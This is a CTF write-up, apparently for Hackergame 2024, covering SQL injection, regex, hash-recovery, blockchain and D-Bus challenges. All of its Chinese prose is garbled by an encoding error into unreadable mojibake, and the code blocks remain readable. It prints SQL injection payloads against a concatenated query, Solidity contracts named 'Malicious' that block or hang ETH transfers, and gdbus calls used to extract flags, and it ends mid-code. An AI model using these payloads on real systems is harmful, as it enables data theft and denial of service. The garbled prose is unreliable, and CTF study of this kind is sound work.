é‚£ä¹ˆç¬¬äºŒä¸ªflagä¼šåœ¨å“ªé‡Œå‘¢ï¼Ÿæ ¹æ®å°é¢˜åâ€œçª¥è§†æœªçŸ¥â€ï¼Œæ„Ÿè§‰è¿™ä¸ªæ²¡æ‰¾åˆ°çš„flagåƒæ˜¯è—åœ¨ä»€ä¹ˆæœªçŸ¥çš„åœ°æ–¹ï¼ˆä»€ä¹ˆåºŸè¯æ–‡å­¦ï¼‰

æˆ‘çœ‹äº†å¥½ä¹…é¢˜ç›®ï¼Œå‘ç°å±…ç„¶è¿™é¢˜è¿˜æœ‰ä¸ªé™„ä»¶å¯ä»¥ä¸‹è½½ã€‚ã€‚ã€‚ç«é€Ÿä¸‹è½½ä¸‹æ¥ï¼Œå‘ç°ä¸€ä¸ªå‡½æ•°ï¼š

```python
@app.route("/view")
def view():
    conversation_id = request.args.get("conversation_id")
    results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
    return render_template("view.html", message=Message(None, results[0], results[1]))
```

è¿™é‡Œçš„SQLè¯­å¥å±…ç„¶æ˜¯ç›´æ¥å­—ç¬¦ä¸²æ‹¼æ¥æ¥çš„ï¼Œé‚£ä¹ˆè‡ªç„¶å¯ä»¥SQLæ³¨å…¥ï¼Œç„¶åæ³¨æ„åˆ°ï¼š

```python
@app.route("/list")
def list():
    results = execute_query("select id, title from messages where shown = true", fetch_all=True)
    messages = [Message(m[0], m[1], None) for m in results]
    return render_template("list.html", messages=messages)
```

çœ‹æ¥è¿˜æœ‰`shown = false`çš„å¯¹è¯ï¼Œäºæ˜¯æˆ‘ä»¬åªè¦æ„é€ `conversation_id`ï¼š

```raw
1' OR shown = false--
```

å³å¯æ‰¾åˆ°flag2ã€‚

é‚£ä¹ˆç”¨åŒæ ·çš„æ–¹æ³•ä¹Ÿå¯ä»¥æ‰¾åˆ°flag1ï¼š

```raw
1' OR contents LIKE '%flag%'--
```

## å¼ºå¤§çš„æ­£åˆ™è¡¨è¾¾å¼

è¦å†™ä¸‰ä¸ªæ­£åˆ™è¡¨è¾¾å¼å®Œæˆä¸‰ç§ä¸åŒçš„è®¡ç®—ï¼Œé™åˆ¶å­—ç¬¦ä¸º`0123456789()|*`

### Easy

è®¡ç®—10è¿›åˆ¶ä¸‹å¯¹16çš„å–æ¨¡ï¼Œè¦æ±‚å–æ¨¡ä¸º0æ—¶åŒ¹é…æˆåŠŸã€‚

è¿™å°±æ˜¯ä¸ªé€åˆ†é¢˜ï¼Œæˆ‘ä»¬çŸ¥é“10è¿›åˆ¶ä¸‹ä¸€ä¸ªæ•°æ˜¯å¦ä¸º16çš„å€æ•°å¯ä»¥æ ¹æ®å…¶æœ€åå››ä½æ•°å­—æ¥åˆ¤æ–­ã€‚

äºæ˜¯åªè¦éå†ä¸€ä¸‹æœ€åå››ä½æ•°å­—ï¼Œå†æŠŠå‰é¢çš„ä¸€æ‹¼å°±è¡Œäº†ï¼š

```python
s = '(0|1|2|3|4|5|6|7|8|9)*('
for i in range(10000 // 16):
    s += f'{i * 16:04}|'
s = s[:-1] + ')'
```

### Medium

è®¡ç®—2è¿›åˆ¶ä¸‹å¯¹13çš„å–æ¨¡ï¼Œè¦æ±‚å–æ¨¡ä¸º0æ—¶åŒ¹é…æˆåŠŸã€‚

è¿™æˆ‘å°±ä¸ä¼šäº†ï¼Œè™½ç„¶çŸ¥é“æ˜¯è¦å»æ„é€ æœ‰é™çŠ¶æ€è‡ªåŠ¨æœºï¼Œä½†å…¶å®æˆ‘ä¸€ç›´éƒ½ä¸ä¼šè¿™ä¸ªç©æ„ï¼Œä¹Ÿæœ‰ç‚¹æ‡’å¾—å­¦ï¼ˆèµ›åä¸€å®šè¡¥ä¸Šï¼‰

ä¸è¿‡å¥½åœ¨æˆ‘æ‰¾åˆ°ä¸€ä¸ªè€å“¥GitHubä¸Šå†™çš„ä¸€ä¸ªå‡½æ•°ï¼š[Regular Expression for Binary Numbers Divisible by n](https://github.com/NIaa/codewars/tree/master/Solutions/1_kyu/Regular%20Expression%20for%20Binary%20Numbers%20Divisible%20by%20n)

è¿™ä¸æ˜¯å®Œç¾å¥‘åˆè¿™ä¸ªé¢˜ï¼Ÿäºæ˜¯è¿è¡Œäº†ä¸€ä¸‹ï¼ŒæŠŠ`+`æ¢æˆäº†`*`ï¼Œå«–åˆ°flagã€‚

### Hard

æœä¸åˆ°ä¸€ç‚¹ï¼Œèµ›åä¸€å®šæ¶è¡¥æœ‰é™çŠ¶æ€è‡ªåŠ¨æœºã€‚

## æƒœå­—å¦‚é‡‘ 3.0

ä¸‰ä¸ªé¢˜åˆ†åˆ«è¦æ±‚è¿˜åŸä¸‰ä¸ªæƒœå­—å¦‚é‡‘åŒ–å¤„ç†åçš„æ–‡ä»¶ã€‚

### é¢˜ç›® A

```python
#!/usr/bin/python3                                                              
                                                                                
import atexit, bas64, flask, itertools, os, r                                 
                                                                                
                                                                                
def crc(input: bytes) -> int:                                                   
    poly, poly_degree = 'AaaaaaAaaaAAaaaaAAAAaaaAAAaAaAAAAaAAAaaAaaAaaAaaA', 48 
    asert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == 'A' 
    flip = sum(['a', 'A'].index(poly[i + 1]) << i for i in rang(poly_degree))  
    digest = (1 << poly_degree) - 1                                             
    for b in input:                                                             
        digest = digest ^ b                                                     
        for _ in rang(8):                                                      
            digest = (digest >> 1) ^ (flip if digest & 1 == 1 els 0)           
    return digest ^ (1 << poly_degree) - 1                                      
                                                                                
                                                                                
def hash(input: bytes) -> bytes:                                                
    digest = crc(input)                                                         
    u2, u1, u0 = 0xCb4EcdfD0A9F, 0xa9dec1C1b7A3, 0x60c4B0aAB4Bf                 
    asert (u2, u1, u0) == (223539323800223, 186774198532003, 106397893833919)  
    digest = (digest * (digest * u2 + u1) + u0) % (1 << 48)                     
    return digest.to_bytes(48 // 8, 'litl')                                   
                                                                                
                                                                                
def xzrj(input: bytes) -> bytes:                                                
    pat, repl = rb'([B-DF-HJ-NP-TV-Z])\1*(E(?![A-Z]))?', rb'\1'                 
    return r.sub(pat, repl, input, flags=r.IGNORECAS)                        
                                                                                
                                                                                
paths: list[bytes] = []                                                         
                                                                                
xzrj_bytes: bytes = bytes()                                                     
                                                                                
with open(__fil__, 'rb') as f:                                                 
    for row in f.read().splitlines():                                           
        row = (row.rstrip() + b' ' * 80)[:80]                                   
        path = bas64.b85encod(hash(row)) + b'.txt'                            
        with open(path, 'wb') as pf:                                            
            pf.writ(row)                                                       
            paths.apend(path)                                                  
            xzrj_bytes += xzrj(row) + b'\r\n'                                   
                                                                                
    def clean():                                                                
        for path in paths:                                                      
            try:                                                                
                os.remov(path)                                                 
            except FileNotFoundEror:                                           
                pas                                                            
                                                                                
    atexit.register(clean)                                                      
                                                                                
                                                                                
bp: flask.Blueprint = flask.Blueprint('answer_a', __nam__)                     
                                                                                
                                                                                
@bp.get('/answer_a.py')                                                         
def get() -> flask.Respons:                                                    
    return flask.Respons(xzrj_bytes, content_typ='text/plain; charset=UTF-8') 
                                                                                
                                                                                
@bp.post('/answer_a.py')                                                        
def post() -> flask.Respons:                                                   
    wrong_hints = {}                                                            
    req_lines = flask.request.get_data().splitlines()                           
    iter = enumerat(itertools.zip_longest(paths, req_lines), start=1)          
    for index, (path, req_row) in iter:                                         
        if path is Non:                                                        
            wrong_hints[index] = 'Too many lines for request data'              
            break                                                               
        if req_row is Non:                                                     
            wrong_hints[index] = 'Too few lines for request data'               
            continue                                                            
        req_row_hash = hash(req_row)                                            
        req_row_path = bas64.b85encod(req_row_hash) + b'.txt'                 
        if not os.path.exists(req_row_path):                                    
            wrong_hints[index] = f'Unmatched hash ({req_row_hash.hex()})'       
            continue                                                            
        with open(req_row_path, 'rb') as pf:                                    
            row = pf.read()                                                     
            if len(req_row) != len(row):                                        
                wrong_hints[index] = f'Unmatched length ({len(req_row)})'       
                continue                                                        
            unmatched = [req_b for b, req_b in zip(row, req_row) if b != req_b] 
            if unmatched:                                                       
                wrong_hints[index] = f'Unmatched data (0x{unmatched[-1]:02X})'  
                continue                                                        
            if path != req_row_path:                                            
                wrong_hints[index] = f'Matched but in other lines'              
                continue                                                        
    if wrong_hints:                                                             
        return {'wrong_hints': wrong_hints}, 400                                
    with open('answer_a.txt', 'rb') as af:                                      
        answer_flag = bas64.b85decod(af.read()).decod()                      
        closing, opening = answer_flag[-1:], answer_flag[:5]                    
        asert closing == '}' and opening == 'flag{'                            
        return {'answer_flag': answer_flag}, 200                                
```

é€åˆ†ï¼Œéšä¾¿ä¸€è¡¥å°±å¥½äº†ã€‚

### é¢˜ç›® B

```python
#!/usr/bin/python3                                                              
                                                                                
import atexit, bas64, flask, itertools, os, r                                 
                                                                                
                                                                                
def crc(input: bytes) -> int:                                                   
    poly, poly_degree = 'B', 48 
    asert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == 'B' 
    flip = sum(['b', 'B'].index(poly[i + 1]) << i for i in rang(poly_degree))  
    digest = (1 << poly_degree) - 1                                             
    for b in input:                                                             
        digest = digest ^ b                                                     
        for _ in rang(8):                                                      
            digest = (digest >> 1) ^ (flip if digest & 1 == 1 els 0)           
    return digest ^ (1 << poly_degree) - 1                                      
                                                                                
                                                                                
def hash(input: bytes) -> bytes:                                                
    digest = crc(input)                                                         
    u2, u1, u0 = 0xdbeEaed4cF43, 0xFDFECeBdeeD9, 0xB7E85A4E5Dcd                 
    asert (u2, u1, u0) == (241818181881667, 279270832074457, 202208575380941)  
    digest = (digest * (digest * u2 + u1) + u0) % (1 << 48)                     
    return digest.to_bytes(48 // 8, 'litl')                                   
                                                                                
                                                                                
def xzrj(input: bytes) -> bytes:                                                
    pat, repl = rb'([B-DF-HJ-NP-TV-Z])\1*(E(?![A-Z]))?', rb'\1'                 
    return r.sub(pat, repl, input, flags=r.IGNORECAS)                        
                                                                                
                                                                                
paths: list[bytes] = []                                                         
                                                                                
xzrj_bytes: bytes = bytes()                                                     
                                                                                
with open(__fil__, 'rb') as f:                                                 
    for row in f.read().splitlines():                                           
        row = (row.rstrip() + b' ' * 80)[:80]                                   
        path = bas64.b85encod(hash(row)) + b'.txt'                            
        with open(path, 'wb') as pf:                                            
            pf.writ(row)                                                       
            paths.apend(path)                                                  
            xzrj_bytes += xzrj(row) + b'\r\n'                                   
                                                                                
    def clean():                                                                
        for path in paths:                                                      
            try:                                                                
                os.remov(path)                                                 
            except FileNotFoundEror:                                           
                pas                                                            
                                                                                
    atexit.register(clean)                                                      
                                                                                
                                                                                
bp: flask.Blueprint = flask.Blueprint('answer_b', __nam__)                     
                                                                                
                                                                                
@bp.get('/answer_b.py')                                                         
def get() -> flask.Respons:                                                    
    return flask.Respons(xzrj_bytes, content_typ='text/plain; charset=UTF-8') 
                                                                                
                                                                                
@bp.post('/answer_b.py')                                                        
def post() -> flask.Respons:                                                   
    wrong_hints = {}                                                            
    req_lines = flask.request.get_data().splitlines()                           
    iter = enumerat(itertools.zip_longest(paths, req_lines), start=1)          
    for index, (path, req_row) in iter:                                         
        if path is Non:                                                        
            wrong_hints[index] = 'Too many lines for request data'              
            break                                                               
        if req_row is Non:                                                     
            wrong_hints[index] = 'Too few lines for request data'               
            continue                                                            
        req_row_hash = hash(req_row)                                            
        req_row_path = bas64.b85encod(req_row_hash) + b'.txt'                 
        if not os.path.exists(req_row_path):                                    
            wrong_hints[index] = f'Unmatched hash ({req_row_hash.hex()})'       
            continue                                                            
        with open(req_row_path, 'rb') as pf:                                    
            row = pf.read()                                                     
            if len(req_row) != len(row):                                        
                wrong_hints[index] = f'Unmatched length ({len(req_row)})'       
                continue                                                        
            unmatched = [req_b for b, req_b in zip(row, req_row) if b != req_b] 
            if unmatched:                                                       
                wrong_hints[index] = f'Unmatched data (0x{unmatched[-1]:02X})'  
                continue                                                        
            if path != req_row_path:                                            
                wrong_hints[index] = f'Matched but in other lines'              
                continue                                                        
    if wrong_hints:                                                             
        return {'wrong_hints': wrong_hints}, 400                                
    with open('answer_b.txt', 'rb') as af:                                      
        answer_flag = bas64.b85decod(af.read()).decod()                      
        closing, opening = answer_flag[-1:], answer_flag[:5]                    
        asert closing == '}' and opening == 'flag{'                            
        return {'answer_flag': answer_flag}, 200                                
```

è¦æˆ‘ä»¬è¡¥`crc`å‡½æ•°ä¸­çš„`poly`ï¼Œç›´æ¥ç©·ä¸¾çš„è¯æœ‰ 2 **47 = 140737488355328ä¸ªç»„åˆï¼Œè‚¯å®šè·‘ä¸å®Œã€‚

ä½†æˆ‘å‘ç°ï¼Œå¦‚æœä¿®æ”¹`poly`é åä½ç½®çš„å­—ç¬¦ï¼Œå¥½åƒå¯¹hashå€¼çš„å½±å“ä¸ä¼šå¤ªå¤§ï¼š

```python
print(hash('B' + 'B' * 47 + 'B', b'\xfe').hex())
for _ in range(20):
    print(hash('B' + 'B' * 15 + ''.join(random.choices('Bb', k=32)) + 'B', b'\xfe').hex())
```

äºæ˜¯æˆ‘å°±15ä½15ä½çš„çŒœï¼ˆç©·ä¸¾ 2 ** 15 = 32768 æ¬¡è¿˜æ˜¯å¯è¡Œçš„ï¼‰ã€‚

æœ€å¼€å§‹åŒ¹é…hashå€¼çš„å‰2ä¸ªå­—ç¬¦ï¼Œæ‰¾å‡ºæ‰€æœ‰å¯è¡Œçš„è§£ã€‚å­˜ä¸‹æ¥ä»¥åç»§ç»­çŒœä¸­é—´çš„15ä½ï¼Œï¼ˆç¬¬äºŒæ¬¡åŒ¹é…hashçš„å‰6ä¸ªå­—ç¬¦ï¼Œå¦‚æœæ‰¾å‡ºæ¥å¯è¡Œè§£å¤ªå¤šå°±å†å¤šå¢åŠ ä¸€ä½ï¼‰ï¼Œæœ€åå¾—å‡º128ä¸ªå¯è¡Œè§£ã€‚é€šè¿‡è¿™æœ€åçš„128ä¸ªå¯è¡Œè§£ï¼Œå»ç©·ä¸¾æœ€åçš„17ä¸ªå­—ç¬¦ï¼Œå¤§æ¦‚ç®—äº†3ã€4åˆ†é’Ÿå¾—åˆ°äº†æœ€ç»ˆç¬¦åˆæ¡ä»¶çš„`poly`ã€‚

è¿™é‡Œä»£ç å¤ªä¹±äº†å°±ä¸è´´å®Œæ•´ç‰ˆäº†ï¼ŒçŒœå‰15ä½çš„ä»£ç å¤§æ¦‚æ˜¯è¿™æ ·ï¼š

```python
s = b"\x01"
prefix = ['']
possible = []
for p in tqdm.tqdm(prefix):
    for comb in product('Bb', repeat=15):
        for _ in range(20):
            poly = 'B' + p + ''.join(comb) + 'B'
            h = hash(poly, s).hex()
            if not h.startswith('e3'):
                break
		else:
            possible.append(p + ''.join(comb))
```

### é¢˜ç›® C

Hashé‚£è¡Œæƒ³äº†ä¸€ä¸‹ï¼Œä¼¼ä¹æ²¡ä»€ä¹ˆåŠæ³•å»è¡¥ï¼Œèµ›åçœ‹çœ‹é¢˜è§£æå‡ä¸€ä¸‹æ³¨æ„åŠ›ã€‚

## ä¼˜é›…çš„ä¸ç­‰å¼

çŸ¥ä¹å¸¸é©»ç”¨æˆ·ç›´æ¥æ³¨æ„åˆ°äº†è¿™ç¯‡æ–‡ç« ï¼š[ã€ç§‘æ™®ã€‘å¦‚ä½•ä¼˜é›…åœ°â€œæ³¨æ„åˆ°â€å…³äºeã€Ï€çš„ä¸ç­‰å¼](https://zhuanlan.zhihu.com/p/669285539)

ç»“åˆè¿™é¢˜çš„ç«¯å£å·åŸºæœ¬å¯ä»¥ç¬ƒå®šè¿™å°±æ˜¯æœ€ç»ˆé¢„æœŸè§£æ³•äº†ã€‚

<img src="images/afa47871-5624-409a-b4fb-70e9e4f6692a.png" alt="image-20241109153321580" style="zoom:50%;" />

### Easy

$p=8, q=3$ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸æ¾çš„æ”¾ç¼©ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªç§¯åˆ†æ‰‹è§£å°±èƒ½ç®—å‡ºæ¥ï¼Œæˆ‘é‡‡ç”¨äº†ä¸‹é¢è¿™ä¸ªç§¯åˆ†ï¼š
$$
\int_0^1\frac{x^2(1-x)^2(a+bx+cx^2)}{1+x^2}dx
$$

$$
\left\lbrace\begin{aligned}
&-\frac{b}{2}=1\\
&a-c=0\\
&-\frac{2}{3}a+\frac{19}{12}b+\frac{7}{10}c=-\frac{8}{3}
\end{aligned}\right.
$$

æ±‚å‡º$a,b,c$å³å¯ã€‚

### Hard

è¿™éƒ¨åˆ†åæœŸçš„ä¸ç­‰å¼ä¼šéå¸¸çš„ç´§ï¼Œè€Œæˆ‘ä»¬è¾“å…¥çš„é•¿åº¦æœ‰é™åˆ¶ï¼Œæ•…å¿…é¡»è¶³å¤Ÿä¼˜é›…ã€‚æ³¨æ„åˆ°ä¸Šé¢é‚£ç¯‡çŸ¥ä¹åé¢è¿˜è®¨è®ºäº†â€œåˆ†æ¯å‡å¹‚æ‰©å¤§æ”¶æ•›åŠå¾„â€ï¼Œç»™äº†ä¸€ä¸ªæ–°çš„é“¾æ¥ï¼š[æ„é€ ç§¯åˆ†æ•°å€¼æ¯”è¾ƒçš„æ”¶æ•›æ€§](https://zhuanlan.zhihu.com/p/670472865)

ç‚¹è¿›è¿™ä¸ªé“¾æ¥ï¼Œä¸€ä¸ªè½¯ä»¶çš„æˆªå›¾å‡ºç°åœ¨å±å¹•ä¸Šï¼š

<img src="images/13531551-dd38-4177-9479-f439438b171e.png" alt="image-20241109154421963" style="zoom:50%;" />

å§æ§½ï¼Œç”šè‡³è¿˜æœ‰ä¸ª[åœ¨çº¿é“¾æ¥](https://aistudio.baidu.com/application/detail/39350)ã€‚

ç®€å•ç”¨äº†ä¸¤ä¸‹å‘ç°é€Ÿåº¦å¥‡å¿«ï¼Œå”¯ä¸€çš„é—®é¢˜åœ¨äºå®ƒçš„ç§¯åˆ†æ˜¯ä»0åˆ°æ­£æ— ç©·ï¼Œè¿™é‡Œåšä¸ªå˜é‡ä»£æ¢æŠŠç§¯åˆ†åŸŸæ¢åˆ°0åˆ°1ä¸Šå³å¯ã€‚

äºæ˜¯æˆ‘åœ¨è¿™Mathåˆ†ç±»é¢˜ä¸Šå†™äº†ä¸ªçˆ¬è™«ã€‚

ä»£ç å°±ä¸è´´äº†ã€‚

## æ— æ³•è·å¾—çš„ç§˜å¯†

æ˜¯ä¸ªVNCï¼Œä½†ç¦äº†å¾ˆå¤šæ“ä½œï¼Œæ¯”å¦‚å¤åˆ¶ç²˜è´´ï¼Œå¯¹é¢çš„ç”µè„‘ä¹Ÿä¸èƒ½è”ç½‘ã€‚

é¢˜ç›®è¦æ±‚æˆ‘ä»¬æŠŠ`/secret`è¿™ä¸ªæ–‡ä»¶å¸¦å‡ºæ¥ï¼Œ~~æ„Ÿè§‰ç”¨åˆ°èŒåœºä¸Šéå¸¸çš„åˆ‘~~ã€‚

è¿™é¢˜æˆ‘çš„åšæ³•éå¸¸è ¢ï¼Œç°åœ¨æƒ³èµ·æ¥çœŸæ˜¯å¤ªæœ‰æ¯…åŠ›äº†ï¼Œè¿˜å¾—æ˜¯å› ä¸ºæˆ‘å¿˜äº†åœ¨é˜²æ²‰è¿·é‚£ä¸ªæ™šä¸Šæå‰ä¸‹è½½å…¶ä»–é¢˜çš„é™„ä»¶ï¼Œä¸ç„¶æˆ‘ç»å¯¹ä¼šå†å»æƒ³ä¸€æƒ³åˆ«çš„æ–¹æ³•ã€‚

è®¤çœŸåšè¿‡è¿™é¢˜çš„åŒå­¦ï¼Œçœ‹åˆ°è¿™é‡Œåº”è¯¥å·²ç»çŒœåˆ°äº†ã€‚

æ²¡é”™ï¼Œæˆ‘æ˜¯ç”¨OCRåšçš„è¿™é“é¢˜ã€‚è¿™é“é¢˜èŠ±äº†æˆ‘å¤§çº¦6ä¸ªå°æ—¶ã€‚

---

å…ˆçœ‹äº†ä¸€ä¸‹`/secret`è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°æ˜¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé‚£ä¹ˆäºŒè¿›åˆ¶æ–‡ä»¶è¦æ€ä¹ˆé€šè¿‡æ‰‹æ‰“å‡ºæ¥å‘¢ï¼Ÿæˆ‘æƒ³åˆ°äº†ç”¨`xxd`å‘½ä»¤æŠŠå®ƒè½¬ä¸ºhexï¼Œæ¬¸ğŸ¤“ğŸ‘†è¿™ä¸å°±æ˜¯äººç±»å¯è¯»çš„æ–‡æœ¬äº†å˜›ã€‚

çœ‹äº†ä¸€ä¸‹è¿™ä¸ª`xxd`å¯¼å‡ºçš„æ–‡ä»¶æœ‰17ä¸‡è¡Œï¼Œä¼¼ä¹ä¸æ˜¯ç‰¹åˆ«å¤šï¼Œæˆ‘å¾ˆå¿«å°±å†™äº†è„šæœ¬æŠŠæ‰€æœ‰å†…å®¹æˆªå›¾å‡ºæ¥ä¿å­˜åœ¨æœ¬åœ°ï¼š

<img src="images/7c5c9c08-efa8-4209-b74e-15cafb39b756.png" alt="image-20241109155408747" style="zoom:50%;" />

ç„¶åå°±æ˜¯OCRäº†ï¼Œé—®é¢˜ä¸Šä»€ä¹ˆOCRèƒ½å¤Ÿèƒœä»»è¿™ä¸ªä»»åŠ¡å‘¢ï¼Ÿ

æˆ‘åœ¨è¿™ä¸Šé¢å°è¯•äº†éå¸¸å¤šçš„å„ç±»OCRï¼Œæœ€åè·‘å»ç”³è¯·äº†1000æ¬¡å…è´¹çš„ç™¾åº¦OCRã€‚

è¯´å®è¯ç™¾åº¦OCRå‡†ç¡®ç‡çœŸçš„éå¸¸é«˜ï¼Œé«˜è¾¾99.999%ï¼ˆåšå®Œé¢˜ä»¥åå¾—å‡ºçš„ç»“è®ºï¼‰

ä½†å› ä¸ºè¿™æ–‡ä»¶æœ‰ä¸€ç™¾ä¸‡çš„å­—èŠ‚ï¼Œé«˜è¾¾99.999%çš„å‡†ç¡®ç‡ä¾ç„¶æœ‰10å‡ ä¸ªå­—ç¬¦æ˜¯è¯†åˆ«é”™è¯¯çš„ï¼Œè€Œä¸”å¤§å¤šæ˜¯æŠŠ9è¯†åˆ«0è¿™ç§é”™è¯¯ã€‚ä¸ºäº†æ‰¾è¿™10å‡ ä¸ªå­—ç¬¦ï¼Œæˆ‘å†™äº†ä¸€å †è„šæœ¬ç”¨äºŒåˆ†æ³•åšæ£€æµ‹ï¼ˆå³æŠŠæ–‡ä»¶äºŒåˆ†ï¼Œå¯¹æ¯”å·¦å³çš„hashå€¼å’ŒæœåŠ¡å™¨ä¸Šçš„æ˜¯å¦ä¸€è‡´ï¼Œæ¥ä¸€æ­¥ä¸€æ­¥ç¼©å°è¯†åˆ«é”™è¯¯çš„åŒºé—´ï¼Œå®šä½åˆ°æœ€ç»ˆçš„é‚£ä¸ªé”™è¯¯å­—ç¬¦ï¼‰

ä½†å› ä¸ºå’ŒVNCçš„äº¤äº’å¤ªä¸é¡ºç•…äº†ï¼Œå¹¶ä¸”è¿˜æœ‰å•ä¸ªsession 15åˆ†é’Ÿçš„é™åˆ¶ï¼Œå¹¶ä¸”è¿˜å› ä¸ºä¸å¤Ÿä»”ç»†å‡ºäº†ä¸€å †å¹ºè›¾å­ï¼Œæœ€ç»ˆèŠ±äº†6ä¸ªå°æ—¶æŠŠè¿™é¢˜æäº†å‡ºæ¥ã€‚

åé¢æƒ³åˆ°ä¼¼ä¹å¯ä»¥ç”¨äºŒç»´ç ä¹‹ç±»çš„æ“ä½œï¼ŒçœŸæ˜¯å¤§è…¿æ‹æ–­ã€‚

## é“¾ä¸Šè½¬è´¦åŠ©æ‰‹

è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡çœ‹Hackergameçš„åŒºå—é“¾é¢˜ï¼Œè¿˜æ˜¯å› ä¸ºå‘ç°å‰ä¸¤é—®åšçš„äººå¤šæ‰çœ‹çš„ã€‚å› ä¸ºæˆ‘åŒºå—é“¾è¿˜æ²¡å…¥é—¨ï¼Œæ‰€ä»¥æˆ‘å…¨ç¨‹é—®GPT-4oï¼Œå±…ç„¶è½»æ¾çš„å¥—å‡ºäº†å‰ä¸¤ä¸ªflagã€‚~~ç­‰èµ›åä¸€å®šè®¤çœŸç ”ç©¶è¿™é“é¢˜ã€‚~~

å› ä¸ºæ²¡å•¥æ€è€ƒè¿‡ç¨‹ï¼Œè¿™é‡Œå°±ç›´æ¥è´´ä¸¤ä¸ªpayloadäº†ã€‚

### è½¬è´¦å¤±è´¥

<img src="images/41e04278-288f-4ef5-9546-3a193d838bf4.png" alt="image-20241109184218507" style="zoom:50%;" />

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Malicious {
    receive() external payable {
        revert("Cannot receive ETH");
    }
}
```

### è½¬è´¦åˆå¤±è´¥

<img src="images/dad83c1e-9866-4815-b3d1-ebe175db12a6.png" alt="image-20241109184253252" style="zoom:50%;" />

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Malicious {
    receive() external payable {
        while (true) {}
    }
}
```

## ä¸å¤ªåˆ†å¸ƒå¼çš„è½¯æ€»çº¿

è¿™ä¸€é¢˜åŒæ ·æ˜¯é€šè¿‡æ‹·æ‰“GPT-4oå‡ºçš„ã€‚ä¸è¿‡ç›¸æ¯”äºå‰ä¸€é¢˜ï¼Œéœ€è¦ä¸€äº›ç†è§£å¹¶ä¸”æ€è€ƒä¸€ä¸‹æé—®æ–¹å¼ã€‚

### What DBus Gonna Do?

```c
...
gchar *input;
g_variant_get(parameters, "(&s)", &input);
if (g_strcmp0(input, "Please give me flag1") != 0) {
  return respond_error_msg(
      invocation, "Use input 'Please give me flag1' to get flag1!");
} else {
  return respond_success(invocation, flag1);
}
```

å¥½åƒæ˜¯é€šè¿‡æŸç§æ–¹å¼è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè®©å®ƒç­‰äº`Please give me flag1`å³å¯ã€‚

ç„¶è€Œæˆ‘ä¸çŸ¥é“æ€ä¹ˆå’Œè¿™ç©æ„äº¤äº’ï¼Œå°±é—®äº†ä¸€ä¸‹GPTï¼ŒGPTä¹Ÿä¸è´Ÿä¼—æœ›ï¼š

<img src="images/9676f5fc-81d7-4083-9905-8c1918e93cea.png" alt="image-20241109184922565" style="zoom:50%;" />

```bash
#!/bin/bash


gdbus call --system \
  --dest cn.edu.ustc.lug.hack.FlagService \
  --object-path /cn/edu/ustc/lug/hack/FlagService \
  --method cn.edu.ustc.lug.hack.FlagService.GetFlag1 \
  "Please give me flag1"

```

### If I Could Be A File Descriptor

```c
if (!g_variant_is_of_type(parameters, G_VARIANT_TYPE("(h)"))) {
  return respond_error_msg(invocation,
                           "Give me a file descriptor, please.");
}
gint fd_index;
g_variant_get(parameters, "(h)", &fd_index);
GUnixFDList *fd_list = g_dbus_message_get_unix_fd_list(
    g_dbus_method_invocation_get_message(invocation));
if (!fd_list) {
  return respond_error_msg(
      invocation, "I want a GUnixFDList but you don't give that to me :(");
}
gint fd = g_unix_fd_list_get(fd_list, fd_index, NULL);

// Validate the fd is NOT on filesystem
gchar path[1024];
g_snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
gchar *link = g_file_read_link(path, NULL);
if (link != NULL) {
  if (g_strstr_len(link + 1, -1, "/") != 0) {
    return respond_error_msg(
        invocation, "Please don't give me a file on disk to trick me!");
  }
} else {
  return respond_error_msg(invocation, "Readlink of given FD failed.");
}

char buffer[100];
ssize_t len = read(fd, buffer, sizeof(buffer) - 1);
close(fd);
if (len == -1) {
  return respond_error_msg(invocation,
                           "Cannot read from your file descriptor.");
} else {
  buffer[len] = 0;
}

if (g_strcmp0(buffer, "Please give me flag2\n") != 0) {
  return respond_error_msg(
      invocation,
      "Please give me file descriptor with that message to get flag!");
} else {
  return respond_success(invocation, flag2);
}
```

è¿™ä¸€å°é¢˜åˆ™ä¼¼ä¹æ˜¯éœ€è¦ä¼ å…¥ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œè¿˜ä¸èƒ½æŒ‡å‘æ–‡ä»¶ç³»ç»Ÿä¸Šçš„æ–‡ä»¶ï¼Œç„¶åè®©è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æ‰“å¼€åè¯»å–çš„å†…å®¹æ˜¯`Please give me flag2\n`

ä¸çŸ¥é“ä¸ºå•¥ï¼Œæ²¡èƒ½å®Œå…¨ä»GPTå£ä¸­å¥—å‡ºç­”æ¡ˆï¼š

<img src="images/fa382083-f098-4087-b67c-15cc827b9b6d.png" alt="image-20241109185442773" style="zoom:50%;" />

ä¸è¿‡æ ¹æ®æœåŠ¡å™¨ç»™çš„æŠ¥é”™å†…å®¹ï¼Œè¿™ä¸ªç‰ˆæœ¬å·²éå¸¸æ¥è¿‘æœ€ç»ˆçš„ç­”æ¡ˆäº†ï¼Œæˆ‘è‡ªå·±å°è¯•ç€é­”æ”¹äº†ä¸€ä¸‹ï¼Œå¾—åˆ°äº†ä¸‹é¢çš„è„šæœ¬å¯ä»¥æ‹¿åˆ°flag2ï¼š

```bash
#!/bin/bash


{
    echo -ne "Please give me flag2\n"
} | {
    gdbus call --system \
      --dest cn.edu.ustc.lug.hack.FlagService \
      --object-path /cn/edu/ustc/lug/hack/FlagService \
      --method cn.edu.ustc.lug.hack.FlagService.GetFlag2 0
}

```

### Comm Say Maybe

```c
const gchar *caller_name = g_dbus_method_invocation_get_sender(invocation);
GError *error = NULL;
GVariant *result = g_dbus_connection_call_sync(
    connection, "org.freedesktop.DBus", "/org/freedesktop/DBus",
    "org.freedesktop.DBus", "GetConnectionUnixProcessID",
    g_variant_new("(s)", caller_name), G_VARIANT_TYPE("(u)"),
    G_DBUS_CALL_FLAGS_NONE, -1, NULL, &error);
if (result == NULL) {
  return respond_error(invocation, error);
}
guint32 pid;
